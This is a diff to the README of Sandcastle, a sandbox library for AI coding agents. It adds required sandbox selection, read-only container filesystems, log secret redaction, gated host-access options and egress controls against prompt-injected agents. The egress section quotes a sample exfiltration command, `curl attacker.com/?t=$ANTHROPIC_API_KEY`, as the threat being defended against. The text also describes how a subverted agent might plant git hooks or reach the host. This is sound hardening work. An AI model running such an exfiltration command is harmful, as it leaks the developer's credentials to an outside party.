@@ -65,7 +65,7 @@ await run({
 
 ## Sandbox Providers
 
-Sandcastle uses a `SandboxProvider` to create isolated environments. The `sandbox` option on `run()`, `interactive()`, and `createSandbox()` accepts any provider, including `noSandbox()` — opt in to running the agent directly on the host when container isolation is undesired. Built-in providers:
+Sandcastle uses a `SandboxProvider` to create isolated environments. The `sandbox` option on `run()`, `interactive()`, and `createSandbox()` is **required** — there is no silent default. Pass a real provider (e.g. `docker()`), or an explicit `noSandbox()` to deliberately run the agent directly on the host when container isolation is undesired. Omitting `sandbox` throws, so running unsandboxed is always a conscious choice. Built-in providers:
 
 | Provider   | Import path                                | Type       | Accepted by                                 |
 | ---------- | ------------------------------------------ | ---------- | ------------------------------------------- |
@@ -74,24 +74,60 @@ Sandcastle uses a `SandboxProvider` to create isolated environments. The `sandbo
 | Vercel     | `@ai-hero/sandcastle/sandboxes/vercel`     | Isolated   | `run()`, `createSandbox()`, `interactive()` |
 | No-sandbox | `@ai-hero/sandcastle/sandboxes/no-sandbox` | None       | `run()`, `createSandbox()`, `interactive()` |
 
-Worktree methods (`wt.run()`, `wt.interactive()`, `wt.createSandbox()`) accept the same providers as their top-level counterparts. `wt.interactive()` defaults to `noSandbox()` when no sandbox is specified.
+Worktree methods (`wt.run()`, `wt.interactive()`, `wt.createSandbox()`) accept the same providers as their top-level counterparts and, like them, all **require** an explicit `sandbox` — including `wt.interactive()`, which used to fall back to `noSandbox()`. Pass an explicit `noSandbox()` to keep running host-direct.
 
 **Bind-mount hardening.** The bind-mount providers (Docker, Podman) mount the host repo's `.git/hooks` and `.git/config` **read-only** so a prompt-injected agent cannot plant a git hook or a code-executing config entry (`core.hooksPath`, an executable `alias`, an external diff/filter driver, etc.) that would later run as the developer on the host. Commits are unaffected — they write objects and refs, not hooks or config. This blocks in-sandbox repo-local config writes (`git remote add`, `git config --local`, tracking-branch creation); trusted workflows that need those can opt out by setting `SANDCASTLE_ALLOW_GIT_CONFIG_WRITES=1`.
 
-**Run-line hardening.** By default the bind-mount providers also drop privilege and bound resources on the container: `--cap-drop=ALL` (the stock image needs no Linux capabilities), `--security-opt no-new-privileges` (blocks setuid escalation), and `--pids-limit 2048` (fork-bomb protection, generous enough not to throttle parallel builds). These are grouped under a `hardening` option, each field overridable, and there is no default `--memory` ceiling so a legitimate heavy build is never OOM-killed:
+**Run-line hardening.** By default the bind-mount providers also drop privilege and bound resources on the container: `--cap-drop=ALL` (the stock image needs no Linux capabilities), `--security-opt no-new-privileges` (blocks setuid escalation), `--pids-limit 2048` (fork-bomb protection, generous enough not to throttle parallel builds), and a `--read-only` root filesystem paired with `--tmpfs` mounts for exactly the paths a real agent writes (so a subverted agent can't tamper with the baked-in tooling/binaries mid-run). These are grouped under a `hardening` option, each field overridable, and there is no default `--memory` ceiling so a legitimate heavy build is never OOM-killed:
 
-| `hardening` field | Default   | Notes                                                         |
-| ----------------- | --------- | ------------------------------------------------------------- |
-| `capDrop`         | `["ALL"]` | Capabilities to drop. `[]` drops none.                        |
-| `capAdd`          | `[]`      | Add specific capabilities back (e.g. `["NET_BIND_SERVICE"]`). |
-| `noNewPrivileges` | `true`    | `false` omits the flag.                                       |
-| `pidsLimit`       | `2048`    | A number to override, or `false` to remove the limit.         |
-| `memory`          | —         | Opt-in ceiling, e.g. `"8g"`. Omitted unless set.              |
+| `hardening` field | Default          | Notes                                                                                 |
+| ----------------- | ---------------- | ------------------------------------------------------------------------------------- |
+| `capDrop`         | `["ALL"]`        | Capabilities to drop. `[]` drops none.                                                |
+| `capAdd`          | `[]`             | Add specific capabilities back (e.g. `["NET_BIND_SERVICE"]`).                         |
+| `noNewPrivileges` | `true`           | `false` omits the flag.                                                               |
+| `pidsLimit`       | `2048`           | A number to override, or `false` to remove the limit.                                 |
+| `memory`          | —                | Opt-in ceiling, e.g. `"8g"`. Omitted unless set.                                      |
+| `readOnlyRootfs`  | `true`           | `--read-only` rootfs. `false` omits it (and the default tmpfs).                       |
+| `tmpfs`           | writable set (↓) | `--tmpfs` scratch paths. Array of raw specs (`"/p"` / `"/p:opts"`); `[]` mounts none. |
+
+The default `tmpfs` set is `/tmp`, `~/.cache`, `~/.config`, `~/.npm`, and `~/.claude` — the directories a live agent run writes — each mounted `mode=1777` (world-writable + sticky, like `/tmp`) so the non-root `agent` user can write to them (a bare `--tmpfs` is root-owned and would otherwise reject the agent's writes). A blanket `--tmpfs /home/agent` is intentionally avoided because it would shadow the Claude CLI baked into `~/.local`. Two config **files** at the home-dir root — Claude's `~/.claude.json` and git's `~/.gitconfig` (the latter written by Sandcastle's own `git config --global` setup for `safe.directory` + `user.name`/`user.email`) — that `--tmpfs` (directories only) can't cover and a read-only rootfs blocks; so under the default read-only rootfs the Docker/Podman providers point `CLAUDE_CONFIG_DIR` at the `~/.claude` tmpfs and `GIT_CONFIG_GLOBAL` at a file in the `~/.config` tmpfs, keeping both on a writable mount. Each relocation follows the `tmpfs` set — it is applied only while its backing dir (`~/.claude`, `~/.config`) is mounted, so if you replace `tmpfs` keep those two dirs (or relocate the agent's config yourself), otherwise the agent's config/git writes hit the read-only rootfs. Set your own `CLAUDE_CONFIG_DIR` / `GIT_CONFIG_GLOBAL` via the provider `env` to override.
 
 ```typescript
 // Trusted workflow that needs a raised port and a memory ceiling:
 docker({ hardening: { capAdd: ["NET_BIND_SERVICE"], memory: "8g" } });
+
+// Disable the read-only rootfs, or add an extra writable scratch path:
+docker({ hardening: { readOnlyRootfs: false } });
+docker({ hardening: { tmpfs: ["/tmp", "/home/agent/.cache", "/scratch"] } });
 ```
+
+**Secret redaction.** Injected credentials (`ANTHROPIC_API_KEY`, `CLAUDE_CODE_OAUTH_TOKEN`, `GITHUB_TOKEN`, `GH_TOKEN`) and user-declared secrets — env keys whose names look sensitive (`*_TOKEN`, `*_SECRET`, `*PASSWORD*`, `*API_KEY*`, and similar) — are masked with `[redacted]` before they are written to the verbose run log or to the captured session `.jsonl` transcripts on the host. This narrows the blast radius of a single leaked line persisted to disk. It is defense-in-depth, not a substitute for scoping tokens down to short-lived, least-privilege credentials.
+
+**Host-access escape hatches are gated.** A few provider options deliberately punch a hole in the container boundary — `network: "host"` (shares the host network namespace), `groups` (`--group-add`), `devices` (`--device`), and mounting the Docker/Podman socket via `mounts` (Docker-outside-of-Docker). These remain legitimate opt-in features (GPU access, DooD), but each grants the agent host-level access, so they are **inert unless you also pass `allowDangerousHostAccess: true`** — setting one without the acknowledgment throws at construction, so a prompt-injected agent can't reach the host through an option set by accident. Mounting the container-runtime socket additionally logs a runtime warning on every run; where DooD is genuinely needed, prefer a read-only socket-proxy over the raw socket. Custom/proxy networks and `network: "none"` are **not** gated — restricting egress is not a host-access hatch.
+
+**Egress control.** A subverted agent (prompt injection, malicious dependency) can try to exfiltrate the tokens and source it can see — `curl attacker.com/?t=$ANTHROPIC_API_KEY`. Restricting the container's **outbound** network is the control that blocks this, and `network` is the lever. **The default posture is open** — with `network` omitted the container uses the default bridge network, which NATs outbound so the agent reaches `api.anthropic.com`, git hosts, and package registries out of the box. That default is deliberate ([ADR 0021](docs/adr/0021-egress-control-default-open.md)): the agent calls `api.anthropic.com` directly, so a blanket blackout would kill the agent itself. Restriction is opt-in and is the recommendation for untrusted work:
+
+- **Allowlist proxy (recommended for untrusted work).** Attach the container to an **internal** Docker network (no gateway out) plus a filtering forward-proxy that is the only route out and permits only the agent's real endpoints, then point the agent at it:
+
+  ```typescript
+  // One-time host setup (outside Sandcastle):
+  //   docker network create --internal egress-internal
+  //   run your allowlisting forward-proxy (e.g. squid/tinyproxy) with an
+  //   allowlist of api.anthropic.com + your git host + your registries,
+  //   attached to BOTH egress-internal and a normal (outbound) network.
+  docker({
+    network: "egress-internal", // no direct route out — only the proxy can leave
+    env: {
+      HTTPS_PROXY: "http://egress-proxy:3128",
+      HTTP_PROXY: "http://egress-proxy:3128",
+      NO_PROXY: "localhost,127.0.0.1",
+    },
+  });
+  ```
+
+  This leaves the agent fully functional (model calls, installs, git) while `curl attacker.com` is denied by the proxy.
+
+- **`network: "none"` — fully offline.** Cuts all outbound traffic. Usable **only** for tasks that make no model calls, no package installs, and no remote git — it will break any agent that talks to `api.anthropic.com`. Don't reach for it as a general default; it's the offline-only degenerate case.
 
 ```typescript
 import { docker } from "@ai-hero/sandcastle/sandboxes/docker";
@@ -169,16 +205,21 @@ const result = await run({
     selinuxLabel: "z",
     // Optional: provider-level env vars merged at launch time
     env: { DOCKER_SPECIFIC: "value" },
-    // Optional: attach container to Docker network(s) — string or string[]
-    network: "my-network",
-    // Optional: add the container user to supplementary groups via --group-add.
-    // Accepts group names or numeric GIDs (e.g. for a bind-mounted Docker socket).
-    groups: ["docker", 999],
-    // Optional: expose host devices via --device. Each entry is a full device
-    // spec in host[:container[:permissions]] form (e.g. "/dev/kvm").
-    devices: ["/dev/kvm"],
+    // Optional: attach container to a custom/proxy Docker network — string or
+    // string[]. This is the egress-control lever (see the "Egress control"
+    // section above for the allowlist-proxy recipe and network: "none").
+    // network: "my-egress-proxy-net",
     // Optional: limit CPU resources via --cpus. Fractional values allowed (e.g. 1.5).
     // cpus: 2,
+    //
+    // ⚠️ Host-access escape hatches — each grants the agent host-level access
+    // and is INERT unless `allowDangerousHostAccess: true` is also set (the
+    // provider throws otherwise). Only enable for workloads you fully trust:
+    // allowDangerousHostAccess: true,
+    // network: "host",              // shares the host network namespace
+    // groups: ["docker", 999],      // e.g. to reach a bind-mounted Docker socket (DooD)
+    // devices: ["/dev/kvm"],        // exposes host hardware
+    // mounts: [{ hostPath: "/var/run/docker.sock", sandboxPath: "/var/run/docker.sock" }],
   }),
 
   // Host repo directory — replaces process.cwd() as the anchor for
@@ -453,9 +494,11 @@ await using wt = await createWorktree({
 console.log(wt.worktreePath); // host path to the worktree
 console.log(wt.branch); // "agent/fix-42"
 
-// Run an interactive session in the worktree (defaults to noSandbox)
+// Run an interactive session in the worktree (sandbox is required —
+// pass an explicit noSandbox() to run host-direct)
 await wt.interactive({
   agent: claudeCode("claude-opus-4-8"),
+  sandbox: noSandbox(),
   prompt: "Explore the codebase and understand the bug.",
 });
 
